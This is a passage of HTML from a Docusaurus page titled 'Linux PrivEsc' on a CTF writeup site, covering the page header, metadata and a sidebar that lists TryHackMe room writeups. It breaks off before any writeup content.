<!doctype html>
<html lang="en" dir="ltr" class="docs-wrapper docs-doc-page docs-version-current plugin-docs plugin-id-writeups docs-doc-id-Tryhackme/Linux PrivEsc/ Linux PrivEsc">
<head>
<meta charset="UTF-8">
<meta name="generator" content="Docusaurus v2.4.1">
<title data-rh="true">Linux PrivEsc | CyFun</title><meta data-rh="true" name="viewport" content="width=device-width,initial-scale=1"><meta data-rh="true" name="twitter:card" content="summary_large_image"><meta data-rh="true" property="og:image" content="https://s4ch.github.io/img/cydesk.png"><meta data-rh="true" name="twitter:image" content="https://s4ch.github.io/img/cydesk.png"><meta data-rh="true" property="og:url" content="https://s4ch.github.io/writeups/Tryhackme/Linux PrivEsc/ Linux PrivEsc/"><meta data-rh="true" name="docusaurus_locale" content="en"><meta data-rh="true" name="docsearch:language" content="en"><meta data-rh="true" name="robots" content="max-image-preview:large"><meta data-rh="true" name="monetization" content="$ilp.uphold.com/fYPB8Pjyig3z"><meta data-rh="true" name="docusaurus_version" content="current"><meta data-rh="true" name="docusaurus_tag" content="docs-writeups-current"><meta data-rh="true" name="docsearch:version" content="current"><meta data-rh="true" name="docsearch:docusaurus_tag" content="docs-writeups-current"><meta data-rh="true" property="og:title" content="Linux PrivEsc | CyFun"><meta data-rh="true" name="description" content="Practice your Linux Privilege Escalation skills on an intentionally misconfigured Debian VM with multiple ways to get root! SSH is available. Credentialspassword321"><meta data-rh="true" property="og:description" content="Practice your Linux Privilege Escalation skills on an intentionally misconfigured Debian VM with multiple ways to get root! SSH is available. Credentialspassword321"><link data-rh="true" rel="icon" href="/img/favicon.ico"><link data-rh="true" rel="canonical" href="https://s4ch.github.io/writeups/Tryhackme/Linux PrivEsc/ Linux PrivEsc/"><link data-rh="true" rel="alternate" href="https://s4ch.github.io/writeups/Tryhackme/Linux PrivEsc/ Linux PrivEsc/" hreflang="en"><link data-rh="true" rel="alternate" href="https://s4ch.github.io/writeups/Tryhackme/Linux PrivEsc/ Linux PrivEsc/" hreflang="x-default"><link rel="alternate" type="application/rss+xml" href="/blog/rss.xml" title="CyFun RSS Feed">
<link rel="alternate" type="application/atom+xml" href="/blog/atom.xml" title="CyFun Atom Feed">
<link rel="alternate" type="application/json" href="/blog/feed.json" title="CyFun JSON Feed">



<link rel="icon" href="/img/cy.png">
<link rel="manifest" href="/manifest.json">
<meta name="theme-color" content="rgb(37, 194, 160)">
<meta name="apple-mobile-web-app-capable" content="yes">
<meta name="apple-mobile-web-app-status-bar-style" content="#000">
<link rel="apple-touch-icon" href="/img/cy.png">
<link rel="mask-icon" href="/img/cy.png" color="rgb(62, 204, 94)">
<meta name="msapplication-TileImage" content="/img/cy.png">
<meta name="msapplication-TileColor" content="#000"><link rel="stylesheet" href="/assets/css/styles.ff01972a.css">
<link rel="preload" href="/assets/js/runtime~main.3415e7ae.js" as="script">
<link rel="preload" href="/assets/js/main.c90fa39a.js" as="script">
</head>
<body class="navigation-with-keyboard">
<script>!function(){function t(t){document.documentElement.setAttribute("data-theme",t)}var e=function(){var t=null;try{t=new URLSearchParams(window.location.search).get("docusaurus-theme")}catch(t){}return t}()||function(){var t=null;try{t=localStorage.getItem("theme")}catch(t){}return t}();t(null!==e?e:"dark")}()</script><div id="__docusaurus">
<div role="region" aria-label="Skip to main content"><a class="skipToContent_fXgn" href="#__docusaurus_skipToContent_fallback">Skip to main content</a></div><nav aria-label="Main" class="navbar navbar--fixed-top"><div class="navbar__inner"><div class="navbar__items"><button aria-label="Toggle navigation bar" aria-expanded="false" class="navbar__toggle clean-btn" type="button"><svg width="30" height="30" viewBox="0 0 30 30" aria-hidden="true"><path stroke="currentColor" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" d="M4 7h22M4 15h22M4 23h22"></path></svg></button><a class="navbar__brand" href="/"><div class="navbar__logo"><img src="/img/cy.png" alt="Logo" class="themedImage_ToTc themedImage--light_HNdA"><img src="/img/cy.png" alt="Logo" class="themedImage_ToTc themedImage--dark_i4oU"></div><b class="navbar__title text--truncate">CyFun</b></a><a class="navbar__item navbar__link" href="/blog/">Blog</a><a class="navbar__item navbar__link" href="/docs/">Threads</a><a class="navbar__item navbar__link" href="/ctf/">CTF</a><a aria-current="page" class="navbar__item navbar__link navbar__link--active" href="/writeups/">Writeups</a></div><div class="navbar__items navbar__items--right"><a href="https://github.com/s4ch/s4ch.github.io" target="_blank" rel="noopener noreferrer" class="navbar__item navbar__link">GitHub<svg width="13.5" height="13.5" aria-hidden="true" viewBox="0 0 24 24" class="iconExternalLink_nPIU"><path fill="currentColor" d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"></path></svg></a><div class="toggle_vylO colorModeToggle_DEke"><button class="clean-btn toggleButton_gllP toggleButtonDisabled_aARS" type="button" disabled="" title="Switch between dark and light mode (currently dark mode)" aria-label="Switch between dark and light mode (currently dark mode)" aria-live="polite"><svg viewBox="0 0 24 24" width="24" height="24" class="lightToggleIcon_pyhR"><path fill="currentColor" d="M12,9c1.65,0,3,1.35,3,3s-1.35,3-3,3s-3-1.35-3-3S10.35,9,12,9 M12,7c-2.76,0-5,2.24-5,5s2.24,5,5,5s5-2.24,5-5 S14.76,7,12,7L12,7z M2,13l2,0c0.55,0,1-0.45,1-1s-0.45-1-1-1l-2,0c-0.55,0-1,0.45-1,1S1.45,13,2,13z M20,13l2,0c0.55,0,1-0.45,1-1 s-0.45-1-1-1l-2,0c-0.55,0-1,0.45-1,1S19.45,13,20,13z M11,2v2c0,0.55,0.45,1,1,1s1-0.45,1-1V2c0-0.55-0.45-1-1-1S11,1.45,11,2z M11,20v2c0,0.55,0.45,1,1,1s1-0.45,1-1v-2c0-0.55-0.45-1-1-1C11.45,19,11,19.45,11,20z M5.99,4.58c-0.39-0.39-1.03-0.39-1.41,0 c-0.39,0.39-0.39,1.03,0,1.41l1.06,1.06c0.39,0.39,1.03,0.39,1.41,0s0.39-1.03,0-1.41L5.99,4.58z M18.36,16.95 c-0.39-0.39-1.03-0.39-1.41,0c-0.39,0.39-0.39,1.03,0,1.41l1.06,1.06c0.39,0.39,1.03,0.39,1.41,0c0.39-0.39,0.39-1.03,0-1.41 L18.36,16.95z M19.42,5.99c0.39-0.39,0.39-1.03,0-1.41c-0.39-0.39-1.03-0.39-1.41,0l-1.06,1.06c-0.39,0.39-0.39,1.03,0,1.41 s1.03,0.39,1.41,0L19.42,5.99z M7.05,18.36c0.39-0.39,0.39-1.03,0-1.41c-0.39-0.39-1.03-0.39-1.41,0l-1.06,1.06 c-0.39,0.39-0.39,1.03,0,1.41s1.03,0.39,1.41,0L7.05,18.36z"></path></svg><svg viewBox="0 0 24 24" width="24" height="24" class="darkToggleIcon_wfgR"><path fill="currentColor" d="M9.37,5.51C9.19,6.15,9.1,6.82,9.1,7.5c0,4.08,3.32,7.4,7.4,7.4c0.68,0,1.35-0.09,1.99-0.27C17.45,17.19,14.93,19,12,19 c-3.86,0-7-3.14-7-7C5,9.07,6.81,6.55,9.37,5.51z M12,3c-4.97,0-9,4.03-9,9s4.03,9,9,9s9-4.03,9-9c0-0.46-0.04-0.92-0.1-1.36 c-0.98,1.37-2.58,2.26-4.4,2.26c-2.98,0-5.4-2.42-5.4-5.4c0-1.81,0.89-3.42,2.26-4.4C12.92,3.04,12.46,3,12,3L12,3z"></path></svg></button></div><div class="searchBox_ZlJk"></div></div></div><div role="presentation" class="navbar-sidebar__backdrop"></div></nav><div id="__docusaurus_skipToContent_fallback" class="main-wrapper mainWrapper_z2l0 docsWrapper_BCFX"><button aria-label="Scroll back to top" class="clean-btn theme-back-to-top-button backToTopButton_sjWU" type="button"></button><div class="docPage__5DB"><aside class="theme-doc-sidebar-container docSidebarContainer_b6E3"><div class="sidebarViewport_Xe31"><div class="sidebar_njMd"><nav aria-label="Docs sidebar" class="menu thin-scrollbar menu_SIkG"><ul class="theme-doc-sidebar-menu menu__list"><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-1 menu__list-item"><a class="menu__link" href="/writeups/">About</a></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" href="/writeups/HackTheBox/Academy/write-up/">HackTheBox</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret menu__link--active" aria-expanded="true" href="/writeups/Tryhackme/0day/">Tryhackme</a></div><ul style="display:block;overflow:visible;height:auto" class="menu__list"><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/0day/">0day</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Active Directory Basics/">Active Directory Basics</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Advent of Cyber/">Advent of Cyber</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Advent of Cyber 2/">Advent of Cyber 2</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Adventure Time/">Adventure Time</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Agent Sudo/">Agent Sudo</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Alfred/">Alfred</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Anonforce/">Anonforce</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Anonymous/">Anonymous</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Anonymous Playground/">Anonymous Playground</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Anthem/">Anthem</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Aster/">Aster</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/AttackerKB/">AttackerKB</a></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/Tryhackme/Attacking ICS Plant 1/Attacking ICS Plant/">Attacking ICS Plant 1</a></div></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Attacking Kerberos/">Attacking Kerberos</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Attacktive Directory/">Attacktive Directory</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Authenticate/">Authenticate</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Avengers Blog/">Avengers Blog</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Basic Malware RE/">Basic Malware RE</a></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/Tryhackme/BasicPentesting/Basic Pentesting/">BasicPentesting</a></div></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Binex/">Binex</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Biohazard/">Biohazard</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Blog/">Blog</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Blue/">Blue</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Blueprint/">Blueprint</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Boiler CTF/">Boiler CTF</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Bolt/">Bolt</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Borderlands/">Borderlands</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Bounty Hacker/">Bounty Hacker</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Brainstorm/">Brainstorm</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Break Out The Cage/">Break Out The Cage</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Break it/">Break it</a></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/Tryhackme/Brooklyn Nine Nine/Brookyln nine nine/">Brooklyn Nine Nine</a></div></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Brute It/">Brute It</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Buffer Overflow Prep/">Buffer Overflow Prep</a></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/Tryhackme/Burp Suite/Burpsuite/">Burp Suite</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/Tryhackme/C4ptur3-th3-fl4g/c4ptur3 th3 fl4g/">C4ptur3-th3-fl4g</a></div></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/CC Steganography/">CC: Steganography</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/CMesS/">CMesS</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/CTF collection Vol.1/">CTF collection Vol.1</a></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/Tryhackme/Carpe Diem 1/Carpe Deim 1/">Carpe Diem 1</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/Tryhackme/CherryBlossom/Cherry Blossom/">CherryBlossom</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/Tryhackme/Cicada-3301 Vol.1/Cicada 3301 Vol.1/">Cicada-3301 Vol.1</a></div></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Common Linux Privesc/">Common Linux Privesc</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/ConvertMyVideo/">ConvertMyVideo</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Crack the hash/">Crack the hash</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Cross-site Scripting/">Cross-site Scripting</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Daily Bugle/">Daily Bugle</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Dav/">Dav</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Daves Blog/">Dave&#x27;s Blog</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Develpy/">Develpy</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Dogcat/">dogcat</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Easy Peasy/">Easy Peasy</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Empire/">Empire</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Encryption - Crypto 101/">Encryption - Crypto 101</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Erit Securus I/">Erit Securus I</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/For Business Reasons/">For Business Reasons</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Forensics/">Forensics</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Game Zone/">Game Zone</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/GamingServer/">GamingServer</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Gatekeeper/">Gatekeeper</a></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/Tryhackme/Geolocating Images/Geolocating/">Geolocating Images</a></div></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Getting Started/">Getting Started</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Ghizer/">Ghizer</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Git Happens/">Git Happens</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Google Dorking/">Google Dorking</a></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/Tryhackme/Gotta Catchem All/Gotta Catch em All/">Gotta Catchem All</a></div></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/GraphQL/">GraphQL</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/HA Joker CTF/">HA Joker CTF</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/HackerNote/">hackerNote</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Hacking with Powershell/">Hacking with Powershell</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Harder/">harder</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Hashing - Crypto 101/">Hashing - Crypto 101</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/HaskHell/">HaskHell</a></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/Tryhackme/Hc0n Christmas CTF/hcon christmas ctf/">Hc0n Christmas CTF</a></div></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/HeartBleed/">HeartBleed</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/History of Malware/">History of Malware</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Hydra/">Hydra Introduction</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Ice/">ICE</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Ignite/">Ignite</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Inclusion/">Inclusion</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Inoculation/">Inoculation</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Internal/">Internal</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Intro to Python/">Intro to Python</a></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/Tryhackme/Intro to x86-64/Intro to x86 and 64/">Intro to x86-64</a></div></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Introduction to Django/">Introduction to Django</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Introductory Networking/">Introductory Networking</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Investigating Windows/">Investigating Windows</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Iron Corp/">Iron Corp</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Jack/">Jack</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Jack-of-All-Trades/">Jack-of-All-Trades</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Jacob the Boss/">Jacob the Boss</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/JavaScript Basics/">JavaScript Basics</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Jeff/">Jeff</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Jupyter 101/">Jupyter 101</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Jurassic Park/">Jurassic Park</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Kali Machine/">Kali Machine</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Kenobi/">Kenobi</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Kiba/">kiba</a></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/Tryhackme/LFI/UFI/">LFI</a></div></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/LFI Basics/">LFI Basics</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/LazyAdmin/">LazyAdmin</a></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/Tryhackme/Lian_Yu/Lian Yu/">Lian_Yu</a></div></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Library/">Library</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 